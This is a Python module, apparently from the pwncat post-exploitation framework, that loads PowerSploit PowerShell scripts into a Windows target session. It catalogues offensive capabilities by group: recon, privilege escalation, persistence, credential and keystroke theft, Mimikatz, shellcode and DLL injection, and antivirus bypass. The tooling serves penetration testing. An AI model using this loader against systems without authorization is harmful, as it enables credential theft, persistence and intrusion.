#!/usr/bin/env python3
import os.path

import pkg_resources

from pwncat.modules import Result, Status, Argument, BaseModule, ModuleFailed
from pwncat.platform.windows import Windows, PowershellError


class GroupInfo(Result):
    def __init__(self, name: str):
        self.name = name

    def category(self, session: "pwncat.manager.Session"):
        return "PowerSploit Module Groups"

    def title(self, session: "pwncat.manager.Session"):
        return f"[cyan]{self.name}[/cyan]"

    def __str__(self):
        return self.name


class Module(BaseModule):
    """
    Load and execute modules from the PowerSploit PowerShell library. Modules are loaded in
    groups referring to the directory structure of PowerSploit. Passing no arguments to this
    module will list all available groups. Modules are downloaded directly from GitHub and
    sideloaded to the target.

    The PowerSploit source can be seen at https://github.com/PowerShellMafia/PowerSploit
    """

    MODULES = {
        "recon": [
            "Recon/Get-ComputerDetail.ps1",
            "Recon/Get-HttpStatus.ps1",
            "Recon/Invoke-CompareAttributesForClass.ps1",
            "Recon/Invoke-Portscan.ps1",
            "Recon/Invoke-ReverseDnsLookup.ps1",
            "Recon/PowerView.ps1",
        ],
        "privesc": [
            "Privesc/PowerUp.ps1",
            "Privesc/Get-System.ps1",
        ],
        "persist": [
            "Persistence/Persistence.psm1",
        ],
        "mayhem": [
            "Mayhem/Mayhem.psm1",
        ],
        "exfil": [
            "Exfiltration/Get-GPPAutologon.ps1",
            "Exfiltration/Get-GPPPassword.ps1",
            "Exfiltration/Get-Keystrokes.ps1",
            "Exfiltration/Get-MicrophoneAudio.ps1",
            "Exfiltration/Get-TimedScreenshot.ps1",
            "Exfiltration/Get-VaultCredential.ps1",
            "Exfiltration/Invoke-CredentialInjection.ps1",
            "Exfiltration/Invoke-Mimikatz.ps1",
            "Exfiltration/Invoke-NinjaCopy.ps1",
            "Exfiltration/Invoke-TokenManipulation.ps1",
            "Exfiltration/Out-Minidump.ps1",
            "Exfiltration/VolumeShadowCopyTools.ps1",
        ],
        "exec": [
            "CodeExecution/Invoke-DllInjection.ps1",
            "CodeExecution/Invoke-ReflectivePEInjection.ps1",
            "CodeExecution/Invoke-Shellcode.ps1",
            "CodeExecution/Invoke-WmiCommand.ps1",
        ],
        "bypass": [
            "AntivirusBypass/Find-AVSignature.ps1",
        ],
        "script": [
            "ScriptModification/Out-CompressedDll.ps1",
            "ScriptModification/Out-EncodedCommand.ps1",
            "ScriptModification/Out-EncryptedScript.ps1",
            "ScriptModification/Remove-Comment.ps1",
        ],
    }
    POWERSPLOIT_URL = (
        "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/"
    )
    PLATFORM = [Windows]
    ARGUMENTS = {
        "group": Argument(
            str,
            default="list",
            help="Name of the PowerSploit module group to load (default: list groups)",
        ),
    }
    POWERUP_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"

    def run(self, session: "pwncat.manager.Session", group: str):

        # Use the result system so that other modules can query available groups
        if group == "list":
            yield from (GroupInfo(name) for name in self.MODULES.keys())
            return

        # Ensure the user selected a valid group
        if group not in self.MODULES:
            raise ModuleFailed(f"no such PowerSploit module: {group}")

        # Iterate over all sources in the group
        for url in self.MODULES[group]:
            yield Status(f"loading {url.split('/')[-1]}")

            path = pkg_resources.resource_filename(
                "pwncat", os.path.join("data/PowerSploit", url)
            )

            try:
                # Attempt to load the script in the PowerShell context.
                session.run("manage.powershell.import", path=path)
            except PowershellError as exc:
                # We failed, but continue loading other scripts. Just let the user know.
                session.log(f"while loading {url.split('/')[-1]}: {str(exc)}")
